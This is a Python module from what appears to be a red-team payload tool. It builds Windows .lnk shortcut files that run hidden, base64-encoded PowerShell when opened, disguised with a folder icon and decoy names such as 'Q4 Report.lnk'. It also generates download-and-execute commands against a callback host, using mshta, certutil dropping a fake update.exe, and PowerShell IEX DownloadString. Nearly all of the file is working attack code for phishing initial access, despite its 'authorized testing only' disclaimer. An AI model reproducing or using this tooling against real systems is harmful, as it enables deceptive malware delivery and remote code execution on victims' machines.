r"""LNK (Windows Shortcut) payload builder.

Windows .lnk files execute arbitrary commands when opened.
Used for initial access via phishing (T1566.001, T1204.002).

LNK structure (Shell Link Binary format per MS-SHLLINK):
    Header (0x4C bytes)
    → LinkTargetIDList
    → LinkInfo
    → StringData (RelativePath, WorkingDir, CommandLineArgs, IconLocation)

We write a minimal valid LNK that:
    - Targets: %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe
    - Arguments: -NoP -NonI -W Hidden -EncodedCommand <b64>
    - Icon: shell32.dll,0 (folder icon — makes it look like a dir)
    - Shows a decoy name (e.g., "Q4 Report.lnk")

FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import base64
import struct
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from forge_payload.payload_factory import PayloadConfig


def _pack_lnk_header(
    target_size: int = 0,
    attributes: int = 0x20,   # FILE_ATTRIBUTE_NORMAL
    show_cmd: int = 7,        # SW_SHOWMINNOACTIVE (hidden)
    hotkey: int = 0,
) -> bytes:
    """Pack the LNK file header (76 bytes, per MS-SHLLINK 2.1)."""
    header = bytearray(76)
    # HeaderSize
    struct.pack_into("<I", header, 0, 0x4C)
    # LinkCLSID: {00021401-0000-0000-C000-000000000046}
    clsid = bytes([
        0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
    ])
    header[4:20] = clsid
    # LinkFlags: HasArguments | HasWorkingDir | HasRelativePath | HasIconLocation
    link_flags = 0x0000_001C | 0x0000_0200  # HasArguments | IsUnicode
    struct.pack_into("<I", header, 20, link_flags)
    # FileAttributes
    struct.pack_into("<I", header, 24, attributes)
    # ShowCommand
    struct.pack_into("<I", header, 68, show_cmd)
    # HotKey
    struct.pack_into("<H", header, 72, hotkey)
    return bytes(header)


def build_lnk(payload_bytes: bytes, config: "PayloadConfig") -> bytes:
    """Build a Windows LNK file that executes a PowerShell command.

    Args:
        payload_bytes: PS1 script bytes or raw command bytes.
        config:        PayloadConfig.

    Returns:
        LNK file bytes.
    """
    # Build the PS1 command
    try:
        cmd_text = payload_bytes.decode("utf-8").strip()
    except UnicodeDecodeError:
        b64 = base64.b64encode(payload_bytes).decode()
        cmd_text = f"powershell.exe -NoP -NonI -W Hidden -Enc {b64}"

    if not cmd_text.lower().startswith("powershell"):
        b64 = base64.b64encode(cmd_text.encode("utf-16-le")).decode()
        cmd_text = f"powershell.exe -NoP -NonI -W Hidden -Enc {b64}"

    # LNK targets PowerShell
    target_path = r"%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe"
    args_str = f'-NoP -NonI -W Hidden -c "{cmd_text}"'

    header = _pack_lnk_header()

    # StringData section (Unicode, length-prefixed)
    def _unicode_str(s: str) -> bytes:
        enc = s.encode("utf-16-le")
        return struct.pack("<H", len(s)) + enc

    relative_path = _unicode_str(target_path)
    working_dir   = _unicode_str(r"%WINDIR%\System32")
    arguments     = _unicode_str(args_str)
    icon_location = _unicode_str(r"%WINDIR%\System32\shell32.dll")

    lnk = header + relative_path + working_dir + arguments + icon_location
    return lnk


def generate_lnk_command(lhost: str, lport: int, technique: str = "powershell") -> str:
    """Generate the command string for a LNK payload.

    Args:
        lhost:     Callback host.
        lport:     Callback port.
        technique: Execution method: 'powershell', 'mshta', 'certutil'.

    Returns:
        Command string.
    """
    if technique == "powershell":
        from forge_payload.formats.ps1_builder import generate_ps1_oneliner
        return generate_ps1_oneliner(lhost, lport)

    elif technique == "mshta":
        return f"mshta.exe http://{lhost}/payload.hta"

    elif technique == "certutil":
        return (
            f"certutil.exe -urlcache -split -f http://{lhost}/payload.exe %TEMP%\\update.exe "
            f"&& %TEMP%\\update.exe"
        )

    return f"cmd /c start /b powershell -W Hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/s.ps1')\""
